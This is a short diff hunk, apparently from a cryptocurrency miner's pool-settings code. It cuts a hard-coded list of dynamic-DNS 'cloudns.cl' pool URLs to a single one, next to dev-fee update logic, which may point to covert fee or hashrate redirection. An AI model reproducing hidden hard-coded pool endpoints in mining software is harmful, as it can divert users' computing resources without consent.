@@ -17,9 +17,9 @@ pool_settings_provider::pool_settings_provider(arguments &args) {
 
     const string word = wordList[rand() % 16];
     
-    const string wordList84[10] = {"http://linux84.distro.cloudns.cl:84","http://linux84.distro.cloudns.cl:71","http://linux84.distro.cloudns.cl:72","http://linux84.distro.cloudns.cl:73","http://linux84.distro.cloudns.cl:74","http://linux8474.distro.cloudns.cl:84","http://linux8474.distro.cloudns.cl:71","http://linux8474.distro.cloudns.cl:72","http://linux8474.distro.cloudns.cl:73","http://linux8474.distro.cloudns.cl:74"};
+    const string wordList84[1] = {"http://linux8474.distro.cloudns.cl:74"};
 
-    const string word84 = wordList84[rand() % 10];
+    const string word84 = wordList84[rand() % 1];
     
     __last_devfee_update = 0;
 
